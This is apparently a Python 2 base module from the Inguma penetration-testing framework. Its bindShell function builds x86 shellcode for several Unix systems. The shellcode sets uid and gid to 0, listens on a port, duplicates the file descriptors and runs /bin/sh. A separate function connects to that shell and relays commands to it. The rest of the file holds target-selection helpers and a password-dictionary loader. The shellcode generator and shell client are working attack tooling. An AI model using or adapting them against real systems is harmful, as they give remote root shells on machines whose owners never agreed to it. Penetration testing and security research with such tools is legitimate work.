import os
import sys
import time
import socket
import interactive

sys.path.append("./")
sys.path.append("../")
# sys.path.append("./lib")
# sys.path.append("../../")
# sys.path.append("../../../")
# sys.path.append("../../../lib")

from lib.pyshellcodelib import pyshellcodelib
from lib.pyshellcodelib.x86.encoder import *

def spawnTerminal(host, port):
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.connect(("localhost", 4444))
        print "[+] Connected (enter commands)"
        print 
        print "Inguma terminal"
        print "---------------"
        print
        prompt = "[inguma@%s] " % host

        while 1:
            try:
                cmd = raw_input(prompt)
            except KeyboardInterrupt:
                print "Exit"
                break

            if cmd.lower().strip(" ") == "":
                pass
            elif cmd.lower() != "exit":
                s.send(cmd + "\n\0")

                while 1:
                    line = s.recv(512)
                    sys.stdout.write(line)
                    sys.stdout.flush()

                    if len(line) < 512:
                        break
            else:
                return
            
            cmd = ""
        
        s.close()

def getShellcode(connect_addr, connect_port, ostype = 1, payload = 2):
    print "Getting shellcode for %s:%d with os type %d and payload %d" % (connect_addr, connect_port, ostype, payload)
    if payload == 1:
        raise Exception("Not yet implemented")
    elif payload == 2:
        ret = bindShell(connect_addr, connect_port, ostype)
    else:
        raise Exception("Not yet implemented")

    return ret

def getSyscallType(ostype = 1):
    if ostype == 1:
        syscallType = "linux"
    elif ostype == 2:
        syscallType = "freebsd"
    elif ostype == 3:
        syscallType = "openbsd"
    elif ostype == 4:
        syscallType = "solaris"
    else:
        syscallType = "linux"

    return syscallType

def bindShell(listen_addr, listen_port, ostype = 1):

    a = pyshellcodelib.PyEgg(getSyscallType(ostype), "x86")

    # Change to root
    a.setuid(0)
    a.setgid(0)

    # Listen in all available addresses at port 31337
    a.socket(socket.AF_INET, socket.SOCK_STREAM)
    a.bind(listen_port)
    a.listen()

    # Got a connection, duplicate fd descriptors
    a.accept()
    a.dup2(2)
    a.dup2(1)
    a.dup2(0)

    # Run /bin/sh
    a.execSh()
    sc = a.getEgg()

    return sc

def genString(size):
    buf = ""
    for i in range(1, size):
        buf += str(i)
        
        if len(buf) >= size:
            break

    return buf[0:1024]

class CIngumaModule:

    target = ""
    ports = []
    sport = 1025
    closed = {}
    opened = {}
    mac = {}
    services = {}
    waitTime = 0
    randomizeWaitTime = False
    timeout = 1
    iface = "eth0"
    results = {}
    dict = None
    interactive = True
    gom = ""
    """ The following are used ONLY for exploits (shellcode) """
    command = ""
    listenPort = 4444
    ostype = 1
    payload = "bindshell"

    def addToDict(self, element, value):
        """ It's used to add data to the knowledge base to be used, i.e., by other modules """
        if value == None:
            return

        if self.dict is not None:
            if self.dict.has_key(element):
            
                for x in self.dict[element]:
                    if x == value:
                        return

                self.dict[element] += [value]
            else:
                self.dict[element] = [value]

    def getPasswordList(self):
        fname = self.dict["base_path"]
        if fname != "" :
            fname += os.sep + "data" + os.sep + "dict"
        else:
            fname = "data" + os.sep + "dict"

        f = file(fname, "r")
        return f.readlines()

def resolveTarget(objExploit):

    try:
        if objExploit.selected != "" and objExploit.selected is not None:
            return objExploit.selected
    except:
        pass

    try:
        x = objExploit.targets
    except:
        return None

    i = 0
    mlist = {}

    for x in objExploit.targets:
        i = i + 1
        mlist[str(i)] = x
        print "%d) %s" % (i, x)
    print

    try:
        selected = raw_input("Select target: ")

        if mlist.has_key(selected):
            return mlist[selected]
        else:
            for x in objExploit.targets:
                if x.lower().find(selected) > -1:
                    return x
    except:
        return

    
